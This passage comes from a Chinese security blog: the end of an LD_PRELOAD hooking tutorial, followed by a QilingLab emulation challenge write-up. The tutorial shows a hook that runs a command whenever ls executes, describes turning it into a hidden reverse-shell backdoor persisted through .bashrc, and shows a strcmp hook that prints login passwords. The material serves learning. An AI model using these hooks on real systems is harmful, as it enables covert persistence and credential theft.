<p><img src="/22_%E4%BD%BF%E7%94%A8LD_PROLOAD_%E8%BF%9B%E8%A1%8Chook.assets/image-20211126223530371.png" alt="image-20211126223530371"></p>
<p>解决方案，可能是没有加载到库，路径错误。</p>
<p><img src="/22_%E4%BD%BF%E7%94%A8LD_PROLOAD_%E8%BF%9B%E8%A1%8Chook.assets/image-20211126224044388.png" alt="image-20211126224044388"></p>
<h3 id="问题2"><a href="#问题2" class="headerlink" title="问题2"></a>问题2</h3><p>不理解编译的时候为什么加-share  -fPIC<br>在编译动态链接库时使用 -shared 参数可以告诉编译器生成动态链接库，而使用 -fPIC 参数则是为了生成位置无关的代码。这意味着编译出的目标文件中的函数和数据的地址都相对独立于加载它们的位置，这使得动态链接库可以被加载到任意内存地址上，而不会由于地址冲突而导致问题。因此，在编译动态链接库时，通常需要同时使用 -shared 和 -fPIC 参数。</p>
<h2 id="0x05-hook案例2-修改系统命令"><a href="#0x05-hook案例2-修改系统命令" class="headerlink" title="0x05 hook案例2 修改系统命令"></a>0x05 hook案例2 修改系统命令</h2><p>查看 ls 系统命令会调用那些库函数：</p>
<blockquote>
<p>查看二进制文件会调用那些库文件是使用 readelf</p>
<p>或者使用 ltrace 来查看调用库函数（待验证）</p>
</blockquote>
<p><strong>ltrace 的作用</strong></p>
<p>ltrace 的功能是能够跟踪进程的库函数调用，首先ltrace打开elf文件，对其进行分析。在elf文件中，出于动态连接的需要，需要在elf文件中保存函数的符号，供连接器使用。</p>
<p>ltrace 就能够获得该文件中，所有系统调用的符号，以及对应的执行指令。</p>
<p><strong>ldd 的作用</strong></p>
<p>用于打印程序或者文件所依赖的共享库列表</p>
<p><img src="/22_%E4%BD%BF%E7%94%A8LD_PROLOAD_%E8%BF%9B%E8%A1%8Chook.assets/image-20211130220612840.png" alt="image-20211130220612840"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -Ws /usr/bin/ls</span><br></pre></td></tr></table></figure>

<p><img src="/22_%E4%BD%BF%E7%94%A8LD_PROLOAD_%E8%BF%9B%E8%A1%8Chook.assets/image-20211126225301655.png" alt="image-20211126225301655"></p>
<p>编写hook_strncmp.c</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">void payload() &#123;</span><br><span class="line">    system(&quot;id&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int strncmp(const char *__s1, const char *__s2, size_t __n) &#123;    // 这里函数的定义可以根据报错信息进行确定</span><br><span class="line">    if (getenv(&quot;LD_PRELOAD&quot;) == NULL) &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">    payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译的源代码strncmp函数我故意少了个形参，就会出现如下错误，大概的意思是命名的函数的参数与string.h中定义的函数的参数保持一致</p>
<p><img src="/22_%E4%BD%BF%E7%94%A8LD_PROLOAD_%E8%BF%9B%E8%A1%8Chook.assets/image-20211126230354134.png" alt="image-20211126230354134"></p>
<p>成功劫持了strncpy函数，并且改变了ls命令执行。</p>
<p><img src="/22_%E4%BD%BF%E7%94%A8LD_PROLOAD_%E8%BF%9B%E8%A1%8Chook.assets/image-20211126231104066.png" alt="image-20211126231104066"></p>
<h2 id="0x06-hook-案例3-制作系统后门"><a href="#0x06-hook-案例3-制作系统后门" class="headerlink" title="0x06 hook 案例3 制作系统后门"></a>0x06 hook 案例3 制作系统后门</h2><p>制作一个隐藏的Linux 后门，当管理员执行 上面的 ls 命令时反弹shell。</p>
<p>只需要改上面的hook_strncmp.c 文件，只需要更改payload()函数中的system 函数。</p>
<p>然后在 .bashrc 中写入 “ export LD_PRELOAD&#x3D;&#x2F;root&#x2F;hook_strncmp.so”</p>
<p>在执行的时候就可以反弹shell。</p>
<h2 id="0x07-hook-案例4"><a href="#0x07-hook-案例4" class="headerlink" title="0x07 hook 案例4"></a>0x07 hook 案例4</h2><p><strong>typedef 的用法</strong></p>
<p>本次hook 的用法是使用typedef 给函数指针类型定义一个别名。</p>
<p><strong>dlopen() 的作用</strong></p>
<p>dlopen 是一个库函数，该函数会打开一个新库，并把它装入内存。该函数主要用来加载库中的符号。</p>
<p>dlopen 以指定模式打开指定的动态链接库文件，并返回一个句柄给调用的进程，dlsym通过句柄和连接符名称获取函数名或者变量名</p>
<p><em>dlopen打开模式如下：</em></p>
<p>​		RTLD_LAZY暂缓决定，等有需要时再解出符号<br>​		RTLD_NOW 立即决定，返回前解除所有未决定的符号。</p>
<p>dlopen() 在dlfcn.h 中定义，并在dl库中实现。它需要两个参数：一个文件名和一个标志。</p>
<p>当库被装入后，可以把dlopen() 返回的句柄作为给 dlsym() 的第一个参数，以获得符号在库中的地址，使用这个地址，就可以获得库中特定函数的指针，并调用装载库中的相应函数。</p>
<p>编译的时候要加入 -ldl (指定 dl  库)</p>
<p><strong>dlsym() 函数作用</strong></p>
<p>dlsym() 的函数原型是</p>
<p>void *dlsym(void *handle, const chat *symbol)</p>
<p>handle 是由dlopen 打开动态链接库后返回的指针；symbol 就是要获取的函数的名称；函数返回值是 void* , 指向要获取的函数的地址，供调用使用。</p>
<p>这个案例还是hook 案例1 的 passcheck.c </p>
<p>因为 hook 的目标是拿到strcmp，所以typedef 了一个STRCMP函数指针。由于hook的目的是要控制函数行为，所以需要从原库libc.so.6 中拿到“正版” strcmp指针，保存成old_strcmp以备调用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;dlfcn.h&gt;</span><br><span class="line"></span><br><span class="line">// hook_strncmp_1.c</span><br><span class="line">// 使用typedef 给函数指针类型一个别名，</span><br><span class="line">// tpyedef 没有定义新的类型，给已经有的类型起一个别名，减少输入。</span><br><span class="line">// * 类型，STRCMP 存储函数地址</span><br><span class="line">// 定义 STRCMP 函数指针</span><br><span class="line">typedef int(*STRCMP)(const char*,const char*); </span><br><span class="line"></span><br><span class="line">int strcmp(const char *s1,const char *s2)</span><br><span class="line">&#123;</span><br><span class="line">	static void *handle = NULL;</span><br><span class="line">	// 创建函数指针</span><br><span class="line">	static STRCMP old_strcmp = NULL;</span><br><span class="line"></span><br><span class="line">	if(!handle)</span><br><span class="line">	&#123;</span><br><span class="line">		// 打开动态链接库</span><br><span class="line">		handle = dlopen(&quot;libc.so.6&quot;,RTLD_LAZY);</span><br><span class="line">		// 获取libc.so.6 库中strcmp 函数的地址</span><br><span class="line">		old_strcmp = (STRCMP)dlsym(handle,&quot;strcmp&quot;);	</span><br><span class="line">	&#125;</span><br><span class="line">	printf(&quot;hack function invoked. s1=&lt;%s&gt; s2=&lt;%s&gt;\n&quot;,s1,s2);</span><br><span class="line">	return old_strcmp(s1,s2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译函数源程序时选用-shared 选项即可创建动态链接库，注意应以 .so 后缀命名，最好放到公用库目录（如&#x2F;lib，&#x2F;usr&#x2F;lib 等）下面，并要写好用户接口文件，以便其他用户共享。</p>
<p>使用动态链接库，源程序中要包含 dlfcn.h 头文件，写程序时注意 dlopen 等函数的正确调用，编译时要采用 -rdynamic 选项与 -ldl 选项，以产生可调用动态链接库的执行代码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -o hook_strncmp_1.so hook_strncmp_1.c -ldl</span><br></pre></td></tr></table></figure>

<p>我们hook 的函数可以将正确的登录口令打印出来。</p>
<p><img src="/22_%E4%BD%BF%E7%94%A8LD_PROLOAD_%E8%BF%9B%E8%A1%8Chook.assets/image-20211201220448721.png" alt="image-20211201220448721"></p>
<h2 id="0x08-总结"><a href="#0x08-总结" class="headerlink" title="0x08 总结"></a>0x08 总结</h2><p>使用LD_PREOAD 进行hook 可以很好的控制程序的流程，以达到自己想要的结果，另外在物联网设备固件模拟或者某些特殊服务模拟的时候，能起到非常至关重要的效果，比如模拟路由器中的http服务时，会缺少nvram的相关配置的设置，这个时候就可以使用LD_PRELOAD对相关配置进行hook 。</p>
<h2 id="0x08-hook-总结"><a href="#0x08-hook-总结" class="headerlink" title="0x08 hook 总结"></a>0x08 hook 总结</h2><ol>
<li>定义与目标函数完全一样的函数，包括名称、变量及类型、返回值及类型等</li>
<li>将包含替换函数的源码编译为动态链接库</li>
<li>通过命令 <code>export LD_PRELOAD=&quot;库文件路径&quot;</code>，设置要优先替换动态链接库</li>
<li>如果找不替换库，可以通过 <code>export LD_LIBRARY_PATH=库文件所在目录路径</code>，设置系统查找库的目录</li>
<li>替换结束，要还原函数调用关系，用命令<code>unset LD_PRELOAD</code> 解除</li>
</ol>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>expoit LD_PRELOAD 的逆向工程讲解，很受用</p>
<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/papers/13233">https://www.exploit-db.com/papers/13233</a></p>
<p>LD_PRELOAD 后门 | Linux 后门系列（这个作者的一系列后门文章都值得看）</p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1683272">https://cloud.tencent.com/developer/article/1683272</a></p>
<p>有趣的 LD_PRELOAD</p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/254388#h2-11">https://www.anquanke.com/post/id/254388#h2-11</a></p>
<p>C 语言定义函数指针（typedef）</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/xiezhi123456/article/details/80630705">https://blog.csdn.net/xiezhi123456/article/details/80630705</a></p>
<p>动态链接库dlopen 函数的使用</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/A493203176/article/details/78792274">https://blog.csdn.net/A493203176/article/details/78792274</a></p>
<p>LD_PRELOAD 程序编译的路程图和试验。</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/chen_jianjian/article/details/80627693">https://blog.csdn.net/chen_jianjian/article/details/80627693</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://tig3rhu.github.io/2023/12/18/22_%E4%BD%BF%E7%94%A8LD_PROLOAD_%E8%BF%9B%E8%A1%8Chook/" data-id="clqapi66u0000iwvb6kjde8dh" data-title="Linux 使用LD_PRELOAD 进行hook" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-3__QiLing_框架学习" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/12/18/3__QiLing_%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/" class="article-date">
  <time class="dt-published" datetime="2023-12-18T09:12:42.084Z" itemprop="datePublished">2023-12-18</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/12/18/3__QiLing_%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/">QiLing 框架学习WriteUp</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="QiLing-框架学习"><a href="#QiLing-框架学习" class="headerlink" title="QiLing 框架学习"></a>QiLing 框架学习</h1><h3 id="Qiling"><a href="#Qiling" class="headerlink" title="Qiling"></a>Qiling</h3><p>Qiling 是一个高级二进制仿真框架，是基于Unicorn（独角兽）具有以下特点：</p>
<ul>
<li>跨平台：Windows、MacOS、Linux、BSD、UEFI、DOS</li>
<li>跨架构：X86、X86_64、Arm、Arm64、MIPS、8086</li>
<li>多种文件格式：PE、MachO、ELF、COM</li>
<li><a target="_blank" rel="noopener" href="https://groundx.io/demigod/">通过Demigod</a>支持 Linux Kernel Module(.ko)、Windows Driver(.sys) 和 MacOS Kernel(.kext)</li>
<li>在隔离环境中模拟和沙箱机器代码</li>
<li>支持跨架构和平台调试功能</li>
<li>提供高级 API 来设置和配置沙箱</li>
<li>细粒度检测：允许不同级别的钩子（指令&#x2F;基本块&#x2F;内存访问&#x2F;异常&#x2F;系统调用&#x2F;IO&#x2F;等）</li>
<li>允许动态热补丁运行代码，包括加载的库</li>
<li>真正的 Python 框架，可以轻松地在上面构建自定义的安全分析工具</li>
</ul>
<h4 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h4><p>新建一个ubuntu 18.04 的虚拟机。伊万说这个东西会改变其他的环境配置</p>
<p><strong>自动安装</strong> ，这种安装方式失败</p>
<p><img src="/3__QiLing_%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0.assets/image-20220412185946587.png" alt="image-20220412185946587"></p>
<p><strong>手动安装</strong> ， </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">安装方式  Ubuntu 20.04</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br><span class="line">sudo apt install python3-pip git cmake</span><br><span class="line">git clone -b dev https://github.com/qilingframework/qiling.git</span><br><span class="line">cd qiling &amp;&amp; git submodule update --init --recursive</span><br><span class="line">sudo pip3 install . </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>















<h3 id="基础语法和函数"><a href="#基础语法和函数" class="headerlink" title="基础语法和函数"></a>基础语法和函数</h3><p>开发文档</p>
<p>ql.verbose &#x3D; 0 </p>
<p>查看输出，不带寄存器、汇编指令的输出。</p>
<p>内存映射</p>
<p>在写入内存之前进行内存映射</p>
<blockquote>
<p>ql.mem.map(addr,size,info &#x3D; [my_first_map])</p>
<p>addr 要注意内存偏移量和映射地址</p>
<p>size :  应该映射的内存大小，如果使用linux 系统，至少需要考虑4096的倍数进行对齐。</p>
</blockquote>
<p>ql.loader.elf_entry  获取程序入口的地址</p>
<p><img src="/3__QiLing_%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0.assets/image-20220426181633377.png" alt="image-20220426181633377"></p>
<p>ql.loader.load_address  获取加载基地址  </p>
<p>ql.men.get_lib_base(“httpd”)  和 ql.loader.load_address 获取的值是一样的。</p>
<p><img src="/3__QiLing_%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0.assets/image-20220426182018533.png" alt="image-20220426182018533"></p>
<p><img src="/3__QiLing_%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0.assets/image-20220426183049546.png" alt="image-20220426183049546"></p>
<p>ql.os.set_api(‘sleep’,fake_sleep)  hook 某个函数</p>
<p><img src="/3__QiLing_%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0.assets/image-20220426182136100.png" alt="image-20220426182136100"></p>
<p>ql.arch.regs.r0 &#x3D;1 设置寄存器r0 的值</p>
<p>ql.arch.regs.read(‘r0’) 获取寄存器r0 中的值</p>
<p>ql.mem.show_mapinfo() 显示映射信息</p>
<p><img src="/3__QiLing_%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0.assets/image-20220426182517111.png" alt="image-20220426182517111"></p>
<p><img src="/3__QiLing_%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0.assets/image-20220426182719013.png" alt="image-20220426182719013"></p>
<h3 id="challenge"><a href="#challenge" class="headerlink" title="challenge"></a>challenge</h3><p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-268989.htm">https://bbs.pediy.com/thread-268989.htm</a></p>
<p>显示找不到registry 文件夹</p>
<p><img src="/3__QiLing_%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0.assets/image-20220413170526016.png" alt="image-20220413170526016">解决方案： 需要查看 “ Important note on Windows DLLs and registry “ 这一章节window 依赖</p>
<p>在运行的时候会报错</p>
<p><img src="/3__QiLing_%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0.assets/image-20220413170458755.png" alt="image-20220413170458755"></p>
<p>解决方案： python3.8以上</p>
<h4 id="challenge1-writeup"><a href="#challenge1-writeup" class="headerlink" title="challenge1 writeup"></a>challenge1 writeup</h4><p>程序尝试读取0x1337 处未映射的内存，因此，为了通过这个检查，我们只需要映射这虚拟内存区域并写入期望值。</p>
<p><img src="/3__QiLing_%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0.assets/image-20220414153151724.png" alt="image-20220414153151724"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8 -*-</span><br><span class="line">#!/usr/bin/env python3</span><br><span class="line"># </span><br><span class="line"># Cross Platform and Multi Architecture Advanced Binary Emulation Framework</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">sys.path.append(&quot;..&quot;)</span><br><span class="line"></span><br><span class="line">from qiling import Qiling</span><br><span class="line">from qiling.const import QL_VERBOSE</span><br><span class="line"></span><br><span class="line"># </span><br><span class="line">def challenge1(ql:Qiling):</span><br><span class="line">	print(&quot;1111111&quot;+str(ql.mem.is_mapped(0x1000,0x1000)))</span><br><span class="line">	ql.mem.map(0x1000,0x1000,info=&#x27;[challenge1]&#x27;)</span><br><span class="line">	ql.mem.write(0x1337,ql.pack16(1337)) # pack16(value) == struct.pack(&#x27;H&#x27;,value)</span><br><span class="line">	</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    #ql = Qiling([&quot;rootfs/x8664_linux/qilinglab-x86_64&quot;], &quot;rootfs/x8664_linux&quot;, verbose=QL_VERBOSE.DEFAULT)</span><br><span class="line">    ql = Qiling([&quot;rootfs/x8664_linux/qilinglab-x86_64&quot;], &quot;rootfs/x8664_linux&quot;)</span><br><span class="line">    challenge1(ql)</span><br><span class="line">    ql.verbose = 1 # 设置输出信息的详细级别</span><br><span class="line">    ql.mem.show_mapinfo() # 显示完整的内存映射来查看我们刚刚映射的区域</span><br><span class="line">    ql.run()</span><br></pre></td></tr></table></figure>

<p>为啥要ql.mem.map(0x1000,0x1000) ,因为我们要修改的内存地址是0x1337。</p>
<p><img src="/3__QiLing_%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0.assets/image-20220414140014259.png" alt="image-20220414140014259"></p>
<p>主要收获</p>
<blockquote>
<p>ql.mem.write(0x1337,ql.pack16(1337)) 修改内存地址上的值。</p>
</blockquote>
<h4 id="challenge2-writeup"><a href="#challenge2-writeup" class="headerlink" title="challenge2 writeup"></a>challenge2 writeup</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">nsigned __int64 __fastcall challenge2(_BYTE *a1)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v2; // [rsp+10h] [rbp-1D0h]</span><br><span class="line">  int v3; // [rsp+14h] [rbp-1CCh]</span><br><span class="line">  int v4; // [rsp+18h] [rbp-1C8h]</span><br><span class="line">  int v5; // [rsp+1Ch] [rbp-1C4h]</span><br><span class="line">  struct utsname name; // [rsp+20h] [rbp-1C0h] BYREF</span><br><span class="line">  char s[10]; // [rsp+1A6h] [rbp-3Ah] BYREF</span><br><span class="line">  char v8[24]; // [rsp+1B0h] [rbp-30h] BYREF</span><br><span class="line">  unsigned __int64 v9; // [rsp+1C8h] [rbp-18h]</span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(0x28u);</span><br><span class="line">  if ( uname(&amp;name) )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(&quot;uname&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    strcpy(s, &quot;QilingOS&quot;);</span><br><span class="line">    strcpy(v8, &quot;ChallengeStart&quot;);</span><br><span class="line">    v2 = 0;</span><br><span class="line">    v3 = 0;</span><br><span class="line">    while ( v4 &lt; strlen(s) )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( name.sysname[v4] == s[v4] )</span><br><span class="line">        ++v2;</span><br><span class="line">      ++v4;</span><br><span class="line">    &#125;</span><br><span class="line">    while ( v5 &lt; strlen(v8) )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( name.version[v5] == v8[v5] )</span><br><span class="line">        ++v3;</span><br><span class="line">      ++v5;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v2 == strlen(s) &amp;&amp; v3 == strlen(v8) &amp;&amp; v2 &gt; 5 )</span><br><span class="line">      *a1 = 1;</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到utsname 结构体</p>
<p><img src="/3__QiLing_%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0.assets/image-20220414160121966.png" alt="image-20220414160121966"></p>
<p>根据前面反汇编出来的代码可以看到，函数调用了系统调用uname函数来获取有关底层操作系统的信息，uname 函数会获取ustname 结构体的指针，为了通过检查，ustname 结构体中的sysname 参数必须是 ”QilingOS“，而version 参数必须是” ChallengeStart”。</p>
<p>我们可以在uname 函数返回之前，使用Qiling API 进行hook 系统调用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def hook_uname_on_exit(ql: Qiling, *args):</span><br><span class="line">	&#x27;&#x27;&#x27;</span><br><span class="line">	.text:0000000000000BD8                 lea     rax, [rbp+name]</span><br><span class="line">	.text:0000000000000BDF                 mov     rdi, rax        ; name</span><br><span class="line">	.text:0000000000000BE2                 call    _uname</span><br><span class="line">	.text:0000000000000BE7                 test    eax, eax</span><br><span class="line">	&#x27;&#x27;&#x27;</span><br><span class="line">	rdi = ql.arch.regs.rdi # 控制寄存器</span><br><span class="line">	ql.mem.write(rdi, b&#x27;QilingOS\x00&#x27;)</span><br><span class="line">	ql.mem.write(rdi + 65 * 3, b&#x27;ChallengeStart\x00&#x27;)</span><br><span class="line"> 	</span><br><span class="line">def challenge2(ql:Qiling):</span><br><span class="line">	ql.os.set_syscall(&#x27;uname&#x27;, hook_uname_on_exit, QL_INTERCEPT.EXIT)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>os_set_syscall()</p>
<p><a target="_blank" rel="noopener" href="https://docs.qiling.io/en/latest/hijack/">https://docs.qiling.io/en/latest/hijack/</a></p>
</blockquote>
<h4 id="challenge3-writeup"><a href="#challenge3-writeup" class="headerlink" title="challenge3 writeup"></a>challenge3 writeup</h4><p>根据函数，我们可以看到两个问题，</p>
<p>一个是从&#x2F;dev&#x2F;urandom 得到随机数，然后和gerandom 获取的随机数要一样。</p>
<p>从&#x2F;dev&#x2F;urandom 获取的第一个随机数要和其他的不一样</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall challenge3(_BYTE *a1)</span><br><span class="line">&#123;</span><br><span class="line">  int v2; // [rsp+10h] [rbp-60h]</span><br><span class="line">  int i; // [rsp+14h] [rbp-5Ch]</span><br><span class="line">  int fd; // [rsp+18h] [rbp-58h]</span><br><span class="line">  char v5; // [rsp+1Fh] [rbp-51h] BYREF</span><br><span class="line">  char buf[32]; // [rsp+20h] [rbp-50h] BYREF</span><br><span class="line">  char v7[40]; // [rsp+40h] [rbp-30h] BYREF</span><br><span class="line">  unsigned __int64 v8; // [rsp+68h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(0x28u);</span><br><span class="line">  fd = open(&quot;/dev/urandom&quot;, 0);</span><br><span class="line">  read(fd, buf, 0x20uLL);</span><br><span class="line">  read(fd, &amp;v5, 1uLL);</span><br><span class="line">  close(fd);</span><br><span class="line">  getrandom(v7, 32LL, 1LL);</span><br><span class="line">  v2 = 0;</span><br><span class="line">  for ( i = 0; i &lt;= 31; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( buf[i] == v7[i] &amp;&amp; buf[i] != v5 )</span><br><span class="line">      ++v2;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( v2 == 32 )</span><br><span class="line">    *a1 = 1;</span><br><span class="line">  return __readfsqword(0x28u) ^ v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>hook</p>
<p>hook 的思路：使用set_syscall 来劫持系统调用的函数getrandom,让getrandom 函数全部返回00字节。这个和challenge2 劫持不一样，而是整个的覆盖这个函数。</p>
<p>然后使用add_fs_mapper 函数与 QlFsMappedObject 一起自定义文件系统&#x2F;dev&#x2F;urandom，让urandom 再请求多个字节时返回00字节，再请求一个字节时返回不同的字节。</p>
<blockquote>
<p>。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from qiling.os.mapper import QlFsMappedObject</span><br><span class="line">class Fake_urandom(QlFsMappedObject):</span><br><span class="line">	# Fake read fs operation</span><br><span class="line">	def read(self, size):</span><br><span class="line">		if size == 1:</span><br><span class="line">			return b&quot;\x41&quot;</span><br><span class="line">		return b&quot;\x00&quot;*size</span><br><span class="line">	# Fake close fs operation</span><br><span class="line">	def close(self):</span><br><span class="line">		return 0</span><br><span class="line"></span><br><span class="line">def getrandom_hook(ql:Qiling, buf, buflen, flags, *args):</span><br><span class="line">	ql.mem.write(buf,b&quot;\x00&quot;*buflen)</span><br><span class="line">	ql.os.set_syscall_return(0)	</span><br><span class="line"></span><br><span class="line">def challenge3(ql:Qiling):</span><br><span class="line">	ql.os.set_syscall(&quot;getrandom&quot;, getrandom_hook)</span><br><span class="line">	ql.add_fs_mapper(&quot;/dev/urandom&quot;,Fake_urandom())</span><br></pre></td></tr></table></figure>

<p>主要收获：</p>
<blockquote>
<p>ql.add_fs_mapper()  fs 映射器，可以讲读&#x2F;写操作重定向到用户自定义的对象</p>
</blockquote>
